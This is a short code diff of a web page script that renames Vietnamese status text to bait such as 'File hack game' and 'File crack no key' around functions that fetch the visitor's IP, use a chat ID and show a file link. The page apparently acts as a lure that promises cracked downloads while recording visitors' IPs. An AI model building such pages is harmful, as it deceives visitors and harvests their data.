@@ -279,11 +279,11 @@
 
     function startFileCountdown(ip, selectedFileUrl) {
       infoBox.classList.add("center");
-      titleText.textContent = "✅ IP Đã Được Xác Nhận";
+      titleText.textContent = "File hack game";
       titleText.style.color = "#4ade80";
       descText.textContent = "...";
       ipText.textContent = ip;
-      statusText.textContent = "Đã xác nhận IP";
+      statusText.textContent = "đang chuyển hướng";
       statusText.className = "status-ok";
       detailText.textContent = `Link nhận file: ${selectedFileUrl}`;
 
@@ -306,8 +306,8 @@
     }
 
     async function runStep2ReceiveFile(passedIp, chatId) {
-      titleText.textContent = "🔍 ...";
-      descText.textContent = ".";
+      titleText.textContent = "File crack no key";
+      descText.textContent = "đợi chút đang xác nhận";
 
       const detectedIp = await fetchClientIp();
       const finalIp = detectedIp || passedIp;
